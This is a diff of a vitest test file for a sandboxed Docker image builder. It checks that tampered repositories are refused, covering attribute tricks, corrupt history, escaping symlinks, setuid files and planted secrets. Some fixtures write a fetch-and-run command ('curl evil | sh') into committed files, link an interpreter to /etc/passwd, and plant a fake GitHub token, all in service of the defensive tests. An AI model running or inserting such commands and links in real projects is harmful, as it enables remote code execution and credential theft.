@@ -2,9 +2,10 @@
 // login for one repository; the digest is the registry's answer for that repository. Every failure is a fixed word, and nothing is left behind.
 import { execFileSync } from "node:child_process";
 import { existsSync, readFileSync } from "node:fs";
-import { chmod, mkdir, mkdtemp, readFile, readdir, rm, writeFile, symlink, lstat } from "node:fs/promises";
+import { chmod, mkdir, mkdtemp, readFile, readdir, readlink, realpath, rm, writeFile, symlink, lstat } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import {
   SAVED_ENV_BUILD_FAILURES, SavedEnvBuildResultSchema, SavedEnvImageManifestSchema, formatCommandLine, parseCommandLine, savedEnvRepositoryName, testEnvDigest,
@@ -14,7 +15,7 @@ import { buildEnvironmentDraft } from "../../packages/worker/src/env-detect/prop
 import { emptyDetection } from "../../packages/worker/src/env-detect/types.js";
 import type { ProveCommandResult } from "../../packages/worker/src/prove.js";
 import type { DockerCli } from "../../packages/worker/src/swebench/containers.js";
-import { gitStateOf, installGitInto, proveAndBuildSavedImage, rebuildIndexOf, savedEnvDockerfile, savedEnvTag, snapshotGitOf, stageTree, trackedTreeOf, type BuildSandbox, type SavedEnvBuildInput, type SavedEnvBuildPorts } from "../../packages/worker/src/saved-env/build.js";
+import { fsckOf, gitStateOf, hashWithAttributesOf, installGitInto, proveAndBuildSavedImage, rebuildIndexOf, savedEnvDockerfile, savedEnvTag, snapshotGitOf, stageTree, trackedTreeOf, type BuildSandbox, type SavedEnvBuildInput, type SavedEnvBuildPorts } from "../../packages/worker/src/saved-env/build.js";
 import { scanTreeForSecrets } from "../../packages/worker/src/saved-env/secret-scan.js";
 
 const cleanup: string[] = [];
@@ -45,12 +46,13 @@ const git = (cwd: string, ...args: string[]): string => execFileSync("git", args
 const FILES: Record<string, string> = { "package.json": '{"name":"svc"}\n', "package-lock.json": "{}\n", "src/index.js": "module.exports = 1;\n", "run.sh": "#!/bin/sh\necho hi\n", ".gitignore": "node_modules\n" };
 
 /** A real clone-like repository: committed files, an origin URL, and `refs/remotes/origin/main` at HEAD (what the worker's own clone has). Dependencies are untracked. */
-async function makeRepository(root: string, over: { origin?: string; files?: Record<string, string> } = {}): Promise<string> {
+async function makeRepository(root: string, over: { origin?: string; files?: Record<string, string>; links?: Record<string, string> } = {}): Promise<string> {
   const dir = join(root, "svc");
   await mkdir(dir, { recursive: true });
   git(dir, "init", "-q", "-b", "main");
   for (const [name, content] of Object.entries(over.files ?? FILES)) { await mkdir(join(dir, name, ".."), { recursive: true }); await writeFile(join(dir, name), content); }
   await chmod(join(dir, "run.sh"), 0o755);
+  for (const [name, target] of Object.entries(over.links ?? {})) await symlink(target.replace("{ROOT}", await realpath(root)), join(dir, name));
   git(dir, "add", "-A");
   git(dir, "commit", "-q", "-m", "one");
   git(dir, "remote", "add", "origin", over.origin ?? ORIGIN);
@@ -61,7 +63,7 @@ async function makeRepository(root: string, over: { origin?: string; files?: Rec
   return commit;
 }
 
-interface Recorded { calls: string[][]; contexts: Array<{ files: string[]; dockerfile: string; manifest: string; gitConfig: string | undefined; gitEntries: string[]; configDuringPush?: string | undefined }>; }
+interface Recorded { calls: string[][]; contexts: Array<{ links: Record<string, string>; files: string[]; dockerfile: string; manifest: string; gitConfig: string | undefined; gitEntries: string[]; configDuringPush?: string | undefined }>; }
 function fakeDocker(rec: Recorded, over: { build?: number; push?: number; create?: number; inspect?: (args: string[]) => string; tag?: number; digestRepository?: string } = {}): DockerCli {
   return {
     async run(args) {
@@ -72,17 +74,19 @@ function fakeDocker(rec: Recorded, over: { build?: number; push?: number; create
       if (list[0] === "buildx" && list[1] === "build") {
         const context = list[list.length - 1]!;
         const files: string[] = [];
+        const links: Record<string, string> = {};
         const walk = async (dir: string, prefix: string): Promise<void> => {
           for (const entry of await readdir(dir, { withFileTypes: true })) {
             const rel = prefix === "" ? entry.name : `${prefix}/${entry.name}`;
             files.push(rel);
+            if (entry.isSymbolicLink()) links[rel] = await readlink(join(dir, entry.name));
             if (entry.isDirectory()) await walk(join(dir, entry.name), rel);
           }
         };
         await walk(context, "");
         const gitDir = join(context, "seed", "svc", ".git");
         rec.contexts.push({
-          files, dockerfile: await readFile(join(context, "Dockerfile"), "utf8"), manifest: await readFile(join(context, "manifest.json"), "utf8"),
+          links, files, dockerfile: await readFile(join(context, "Dockerfile"), "utf8"), manifest: await readFile(join(context, "manifest.json"), "utf8"),
           gitConfig: await readFile(join(gitDir, "config"), "utf8").catch(() => undefined), gitEntries: await readdir(gitDir).catch(() => []),
         });
         return { ...ok, exitCode: over.build ?? 0 };
@@ -115,7 +119,13 @@ async function world(over: {
   during?: (dir: string) => Promise<void> | void;
   /** Runs right after the fresh clone is made, before anything else (a clone that already holds something). */
   afterClone?: (dir: string) => Promise<void> | void;
+  /** Makes the sandbox report that it already started a process when it is handed over. */
+  alreadyStarted?: boolean;
+  links?: SavedEnvBuildInput["links"];
+  declaredFolders?: string[];
   provePasses?: boolean; commitOverride?: string; builderImage?: string;
+  /** Committed symbolic links (`{ROOT}` in a target is the workspace root). */
+  trackedLinks?: Record<string, string>;
 } = {}): Promise<World> {
   const rec: Recorded = { calls: [], contexts: [] };
   const log: string[] = [];
@@ -123,16 +133,20 @@ async function world(over: {
   const tempParent = await scratch();
   const fresh = { disposed: 0, stopped: 0, root };
   const dir = join(root, "svc");
-  const commit = await makeRepository(root, { ...(over.origin === undefined ? {} : { origin: over.origin }), ...(over.files === undefined ? {} : { files: over.files }) });
+  const commit = await makeRepository(root, { ...(over.origin === undefined ? {} : { origin: over.origin }), ...(over.files === undefined ? {} : { files: over.files }), ...(over.trackedLinks === undefined ? {} : { links: over.trackedLinks }) });
   await over.afterClone?.(dir);
   const env = over.env ?? environment();
   let t = 1_000_000;
   let ran = false;
+  let started = over.alreadyStarted === true;
   const sandbox: BuildSandbox = {
-    id: "fresh-1", rootPath: root, dispose: async () => { fresh.disposed += 1; log.push("disposed"); },
+    id: "fresh-1", rootPath: root,
+    hasStarted: () => started,
+    start: async () => { started = true; log.push("started"); },
+    dispose: async () => { fresh.disposed += 1; log.push("disposed"); },
     stopProcesses: async () => { log.push("stopped"); fresh.stopped += 1; if (over.stopThrows === true) throw new Error("cannot stop"); },
     ports: {
-      runCommand: async (command): Promise<ProveCommandResult> => { log.push(formatCommandLine(command)); t += 1_000; if (!ran) { ran = true; await over.during?.(dir); } return { exitCode: over.provePasses === false ? 1 : 0, timedOut: false, stdout: "", stderr: "" }; },
+      runCommand: async (command): Promise<ProveCommandResult> => { if (!started) throw new Error("the sandbox was not started"); log.push(formatCommandLine(command)); t += 1_000; if (!ran) { ran = true; await over.during?.(dir); } return { exitCode: over.provePasses === false ? 1 : 0, timedOut: false, stdout: "", stderr: "" }; },
       startMock: async () => undefined, probePreprod: async () => true, mockUnmatched: async () => [], buildCoverageMap: async () => undefined, suiteTestCount: async () => 3, now: () => t,
     },
   };
@@ -144,9 +158,11 @@ async function world(over: {
     gitState: gitStateOf,
     rebuildIndex: rebuildIndexOf,
     trackedTree: trackedTreeOf,
-    stage: async (src, dst) => { log.push("stage"); await stageTree(src, dst); },
+    stage: async (src, dst, policy) => { log.push("stage"); await stageTree(src, dst, policy); },
+    fsck: async (dir2) => { log.push("fsck"); await fsckOf(dir2); },
+    hashWithAttributes: hashWithAttributesOf,
     installGit: installGitInto,
-    scan: (dir2, options) => scanTreeForSecrets(dir2, { forbiddenValues: options.forbiddenValues, deadlineAtMs: Date.now() + options.budgetMs }),
+    scan: (dir2, options) => scanTreeForSecrets(dir2, { forbiddenValues: options.forbiddenValues, deadlineAtMs: Date.now() + options.budgetMs, links: options.links }),
     pushSession: async () => { world.sessions += 1; return over.session === undefined ? { registry: REGISTRY, repository: REPOSITORY, username: "AWS", password: PASSWORD, expiresAt: new Date(NOW + 900_000).toISOString() } : over.session(); },
     temporaryFolder: async () => { const d = await mkdtemp(join(tempParent, "t-")); world.temp.push(d); return { path: d, remove: () => rm(d, { recursive: true, force: true }) }; },
     now: () => NOW,
@@ -157,6 +173,7 @@ async function world(over: {
     repositories: [{ repositoryId: "svc", directory: "svc", defaultBranch: "main", commit: over.commitOverride ?? commit }],
     detectorGlobs: [], secretNames: ["PUBLISH_TOKEN"], baseImageDigest: BASE_DIGEST, notFrom: over.notFrom ?? [{ id: "task-1", rootPath: "/mnt/task-1" }], forbiddenValues: over.forbidden ?? [],
     signal: new AbortController().signal, proveDeadlineMs: 3_600_000, ...(over.builderImage === undefined ? {} : { builderImage: over.builderImage }),
+    ...(over.links === undefined ? {} : { links: over.links }), ...(over.declaredFolders === undefined ? {} : { declaredFolders: over.declaredFolders }),
   };
   return world;
 }
@@ -175,7 +192,7 @@ describe("a passing, approved, default-branch build", () => {
     expect(result.manifest).toMatchObject({ schemaVersion: 1, testEnvRevision: 4, imageDigest: IMAGE_DIGEST, commits: [{ repositoryId: "svc", sha: w.commit }] });
     expect(result.manifest.builtAt).toBe("2026-11-02T12:00:00.000Z");
     // the order that makes the checks mean something: trusted .git first, then the project's commands, then the sandbox stops, then the copy is made
-    expect(w.log).toEqual(["snapshot", "npm ci", "npm test", "stopped", "stage", "disposed"]);
+    expect(w.log).toEqual(["snapshot", "fsck", "started", "npm ci", "npm test", "stopped", "stage", "disposed"]);
     expect(dockerVerbs(w.rec)).toEqual(["buildx create", "buildx build", "tag", "push", "inspect", "buildx rm", "rmi", "rmi"]);
     expect(result.tag).toMatch(/^k[a-f0-9]{16}-20261102120000-01234567$/u);
   });
@@ -347,8 +364,8 @@ describe("the sandbox cannot talk the build into a different tree (review F4)", 
     expect(await proveAndBuildSavedImage(behind.input, behind.ports)).toEqual({ ok: false, reason: "not_default_branch" });
   });
 
-  it("untracked files (installed dependencies, caches) are free; a clone that is a link or a file for .git is refused", async () => {
-    const free = await world({ during: async (dir) => { await writeFile(join(dir, "node_modules", "dep", "new.js"), "y\n"); await mkdir(join(dir, ".cache"), { recursive: true }); await writeFile(join(dir, ".cache", "x"), "z"); } });
+  it("untracked dependency and cache folders are free; a clone that is a link or a file for .git is refused", async () => {
+    const free = await world({ during: async (dir) => { await writeFile(join(dir, "node_modules", "dep", "new.js"), "y\n"); } });
     expect((await proveAndBuildSavedImage(free.input, free.ports)).ok).toBe(true);
     expect(free.rec.contexts[0]!.files).toContain("seed/svc/node_modules/dep/new.js");
     const gitfile = await world({ afterClone: async (dir) => { await rm(join(dir, ".git"), { recursive: true }); await writeFile(join(dir, ".git"), "gitdir: /elsewhere\n"); } });
@@ -397,12 +414,12 @@ describe("what stops a build", () => {
     expectNothingBuilt(failing);
   });
 
-  it("a secret in the tree ends the build before docker is run: a token in a source file written during the run, a .env, a value the machine held", async () => {
+  it("a secret in what would be shipped ends the build before docker is run: a token in a dependency, a .env in a build folder, a value the machine held", async () => {
     const token = ["gh", "p_", "a".repeat(36)].join("");
     const held = ["clone", "-", "w".repeat(24)].join("");
     const plants: Array<(dir: string) => Promise<void>> = [
-      async (dir) => { await writeFile(join(dir, "src", "ci.js"), `const t = "${token}";\n`); },
-      async (dir) => { await writeFile(join(dir, ".env"), "A=1\n"); },
+      async (dir) => { await writeFile(join(dir, "node_modules", "dep", "ci.js"), `const t = "${token}";\n`); },
+      async (dir) => { await mkdir(join(dir, "build"), { recursive: true }); await writeFile(join(dir, "build", ".env"), "A=1\n"); },
       async (dir) => { await writeFile(join(dir, "node_modules", "dep", "state.json"), `{"c":"${held}"}`); },
     ];
     for (const during of plants) {
@@ -490,7 +507,7 @@ describe("pieces", () => {
     await writeFile(join(src, "vendor", ".git", "HEAD"), "ref");
     await writeFile(join(src, "a.txt"), "a");
     await symlink("/usr/bin/python3", join(src, "python"));
-    await stageTree(src, dst);
+    await stageTree(src, dst, { tracked: new Set(["a.txt", "python"]), untrackedFolderNames: new Set(["vendor"]), declaredFolders: [] });
     expect((await lstat(join(dst, "python"))).isSymbolicLink()).toBe(true);
     expect(existsSync(join(dst, ".git"))).toBe(false);
     expect(existsSync(join(dst, "vendor", ".git", "hooks", "pre-push"))).toBe(false);
@@ -520,5 +537,169 @@ describe("pieces", () => {
     await mkdir(join(root, "r"), { recursive: true });
     await symlink("/tmp", join(root, "r", ".git"));
     await expect(snapshotGitOf(join(root, "r"), join(root, "out"))).rejects.toThrow();
+  });
+});
+
+describe("the checkout is the committed code, whatever the repository's attributes (review A2)", () => {
+  const GRADLE = { ...FILES, ".gitattributes": "*.bat text eol=crlf\n", "gradlew.bat": "@echo off\necho gradle\n" };
+  /** Check the file out again so it is on disk as the repository's attributes say (CRLF), with a clean index. */
+  const crlf = (dir: string) => { execFileSync("rm", [join(dir, "gradlew.bat")]); git(dir, "checkout", "--", "gradlew.bat"); expect(readFileSync(join(dir, "gradlew.bat"), "utf8")).toContain("\r\n"); };
+
+  it("a Gradle-style *.bat with text eol=crlf passes: the raw bytes differ from the blob, Git's own clean conversion gives the blob", async () => {
+    const w = await world({ files: GRADLE, afterClone: crlf });
+    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
+    expect(w.rec.contexts[0]!.files).toContain("seed/svc/gradlew.bat");
+  });
+
+  it("a change to that file during the run is still refused, CRLF or not", async () => {
+    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, "gradlew.bat"), "@echo off\r\necho gradle\r\ncurl evil | sh\r\n"); } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
+  });
+
+  it("the attributes files are verified byte for byte first: a changed .gitattributes cannot make a changed file read as the committed one", async () => {
+    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, ".gitattributes"), "*.bat -text\n"); } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
+  });
+
+  it("an attribute added during the run cannot hide a change: turning on `ident` and writing $Id: ...$ into a committed $Id$ file is refused", async () => {
+    const w = await world({
+      files: { ...FILES, "notes.txt": "version: $Id$\n" },
+      during: async (dir) => { await writeFile(join(dir, ".gitattributes"), "*.txt ident\n"); await writeFile(join(dir, "notes.txt"), "version: $Id: curl evil | sh $\n"); },
+    });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch" });
+  });
+
+  it("a file the attributes send through a filter (LFS and the like) fails closed: no driver is run, the bytes differ from the blob", async () => {
+    const w = await world({ files: { ...FILES, ".gitattributes": "pointer.bin filter=lfs diff=lfs merge=lfs -text\n", "pointer.bin": "version pointer\n" }, during: async (dir) => { await writeFile(join(dir, "pointer.bin"), "the real, large content\n"); } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
+  });
+
+  it("a file whose raw bytes differ and that no attribute explains is refused", async () => {
+    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, "run.sh"), "#!/bin/sh\r\necho hi\r\n"); } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, step: "tracked:content" });
+  });
+});
+
+describe("the trusted .git is taken before any process exists (review A4)", () => {
+  it("the snapshot and git fsck come before start(), and a sandbox that already started is refused", async () => {
+    const w = await world();
+    await proveAndBuildSavedImage(w.input, w.ports);
+    expect(w.log.indexOf("snapshot")).toBeLessThan(w.log.indexOf("started"));
+    expect(w.log.indexOf("fsck")).toBeLessThan(w.log.indexOf("started"));
+    const early = await world({ alreadyStarted: true });
+    expect(await proveAndBuildSavedImage(early.input, early.ports)).toEqual({ ok: false, reason: "not_fresh", step: "started" });
+    expect(early.log).not.toContain("snapshot");
+  });
+
+  it("a clone whose history is corrupt (git fsck) is refused before the sandbox starts", async () => {
+    const corrupt = async (dir: string) => {
+      const objects = join(dir, ".git", "objects");
+      const folder = (await readdir(objects)).find((name) => /^[0-9a-f]{2}$/u.test(name))!;
+      const file = join(objects, folder, (await readdir(join(objects, folder)))[0]!);
+      await chmod(file, 0o644);
+      await writeFile(file, "not a git object");
+    };
+    const w = await world({ afterClone: corrupt });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false });
+    expect(w.log).not.toContain("started");
+    expect(w.log).not.toContain("npm ci");
+  });
+});
+
+describe("only tracked files and dependency or cache folders are shipped (review A5)", () => {
+  it("untracked conftest.py, pytest.ini, sitecustomize.py, .envrc, .npmrc and a stray source file are dropped; tracked ones, dependency folders, caches and declared folders are kept", async () => {
+    const w = await world({
+      files: { ...FILES, "conftest.py": "# tracked\n" },
+      declaredFolders: ["out"],
+      during: async (dir) => {
+        for (const name of ["pytest.ini", "sitecustomize.py", ".envrc", ".npmrc", "src/extra.py", "conftest_untracked.py"]) await writeFile(join(dir, name), "x\n");
+        for (const folder of ["node_modules/dep", ".venv/lib", "src/__pycache__", "target/classes", ".pytest_cache", "out/reports", "other/stuff"]) { await mkdir(join(dir, folder), { recursive: true }); await writeFile(join(dir, folder, "f"), "y\n"); }
+      },
+    });
+    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
+    const files = w.rec.contexts[0]!.files.filter((file) => file.startsWith("seed/svc/")).map((file) => file.slice("seed/svc/".length));
+    for (const dropped of ["pytest.ini", "sitecustomize.py", ".envrc", ".npmrc", "src/extra.py", "conftest_untracked.py", "other", "other/stuff/f"]) expect(files, dropped).not.toContain(dropped);
+    for (const kept of ["conftest.py", "package.json", "src/index.js", "node_modules/dep/f", ".venv/lib/f", "src/__pycache__/f", "target/classes/f", ".pytest_cache/f", "out/reports/f"]) expect(files, kept).toContain(kept);
+  });
+
+  it("an untracked .env at the top is not shipped at all (so it cannot even be found by the scan)", async () => {
+    const w = await world({ during: async (dir) => { await writeFile(join(dir, ".env"), "A=1\n"); } });
+    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
+    expect(w.rec.contexts[0]!.files).not.toContain("seed/svc/.env");
+  });
+});
+
+describe("links, on the real tree (review A1, A3)", () => {
+  it("a link that reads as inside the tree lexically but goes through other links is refused: a -> . and x -> a/a/a/a/../../../../..", async () => {
+    const w = await world({ during: async (dir) => { await symlink(".", join(dir, "node_modules", "a")); await symlink("a/a/a/a/../../../../..", join(dir, "node_modules", "x")); } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
+    expect(w.rec.calls).toEqual([]);
+  });
+
+  it("an absolute link into the workspace becomes a relative link in the seed; one that would leave the seed is refused", async () => {
+    const w0 = await world();
+    const root = await realpath(w0.fresh.root);
+    const ok = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "node_modules", "dep", "index.js"), join(dir, "node_modules", "alias")); } });
+    expect((await proveAndBuildSavedImage(ok.input, ok.ports)).ok).toBe(true);
+    expect(ok.rec.contexts[0]!.links["seed/svc/node_modules/alias"]).toBe("dep/index.js");
+    // a target in another folder of the workspace stays inside the seed once made relative
+    const sibling = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "..", "elsewhere"), join(dir, "node_modules", "sib")); } });
+    expect((await proveAndBuildSavedImage(sibling.input, sibling.ports)).ok).toBe(true);
+    expect(sibling.rec.contexts[0]!.links["seed/svc/node_modules/sib"]).toBe("../../elsewhere");
+    // a target above the workspace is not the workspace's
+    const out = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "..", "..", "above"), join(dir, "node_modules", "up")); } });
+    void root;
+    expect(await proveAndBuildSavedImage(out.input, out.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
+  });
+
+  it("an absolute link that leaves the workspace is refused unless it is a virtual environment's interpreter in the base image's interpreter folder", async () => {
+    const plain = await world({ during: async (dir) => { await symlink("/usr/bin/python3", join(dir, "node_modules", "python")); } });
+    expect(await proveAndBuildSavedImage(plain.input, plain.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
+    const outside = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/etc/passwd", join(dir, ".venv", "bin", "python")); } });
+    expect(await proveAndBuildSavedImage(outside.input, outside.ports)).toMatchObject({ ok: false });
+    const wrongName = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/usr/bin/python3", join(dir, ".venv", "bin", "sh")); } });
+    expect(await proveAndBuildSavedImage(wrongName.input, wrongName.ports)).toMatchObject({ ok: false });
+    const noConfig = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await symlink("/usr/bin/python3", join(dir, ".venv", "bin", "python")); } });
+    expect(await proveAndBuildSavedImage(noConfig.input, noConfig.ports)).toMatchObject({ ok: false });
+    const venv = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/usr/bin/python3.12", join(dir, ".venv", "bin", "python")); await symlink("python", join(dir, ".venv", "bin", "python3")); } });
+    expect((await proveAndBuildSavedImage(venv.input, venv.ports)).ok).toBe(true);
+    expect(venv.rec.contexts[0]!.links["seed/svc/.venv/bin/python"]).toBe("/usr/bin/python3.12");
+  });
+
+  it("a COMMITTED absolute link into the workspace is committed content: it is not rewritten, and an absolute link is refused", async () => {
+    const w = await world({ trackedLinks: { "committed-link": "{ROOT}/svc/package.json" } });
+    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
+    const relative = await world({ trackedLinks: { "committed-link": "package.json" } });
+    expect((await proveAndBuildSavedImage(relative.input, relative.ports)).ok).toBe(true);
+    expect(relative.rec.contexts[0]!.links["seed/svc/committed-link"]).toBe("package.json");
+  });
+
+  it("a real `python -m venv` tree is shipped when its interpreter folder is the base image's, with its links intact and no rewriting of the interpreter links", async () => {
+    let target = "";
+    let link_name = "";
+    const w = await world({
+      links: { interpreterDirectories: [], interpreterTrees: [] },
+      during: async (dir) => { execFileSync("python3", ["-m", "venv", "--without-pip", join(dir, ".venv")]); for (const name of await readdir(join(dir, ".venv", "bin"))) { const link = await readlink(join(dir, ".venv", "bin", name)).catch(() => ""); if (path.isAbsolute(link)) { target = link; link_name = name; } } },
+    });
+    // With no interpreter folder allowed, the real environment is refused (its links are absolute outside the workspace) ...
+    const first = await proveAndBuildSavedImage(w.input, w.ports);
+    expect(path.isAbsolute(target) && /^python3(\.\d{1,2})?$/u.test(path.posix.basename(target)), `this machine's venv layout: ${target}`).toBe(true);
+    expect(first).toMatchObject({ ok: false, reason: "unsafe_tree", step: "scan" });
+    // ... and accepted when the base image's interpreter folder is the one the environment names.
+    const again = await world({
+      links: { interpreterDirectories: [path.posix.dirname(target)], interpreterTrees: [] },
+      during: async (dir) => { execFileSync("python3", ["-m", "venv", "--without-pip", join(dir, ".venv")]); },
+    });
+    expect((await proveAndBuildSavedImage(again.input, again.ports)).ok).toBe(true);
+    expect(again.rec.contexts[0]!.links[`seed/svc/.venv/bin/${link_name}`]).toBe(target);
+    expect(Object.keys(again.rec.contexts[0]!.links).filter((link) => link.startsWith("seed/svc/.venv/bin/")).length).toBeGreaterThanOrEqual(2);
+    expect(again.rec.contexts[0]!.files).toContain("seed/svc/.venv/pyvenv.cfg");
+  });
+
+  it("a set-user-id or set-group-id file ends the build (review B3)", async () => {
+    for (const mode of [0o4755, 0o2755]) {
+      const w = await world({ during: async (dir) => { await chmod(join(dir, "node_modules", "dep", "index.js"), mode); } });
+      expect(await proveAndBuildSavedImage(w.input, w.ports), mode.toString(8)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
+    }
   });
 });
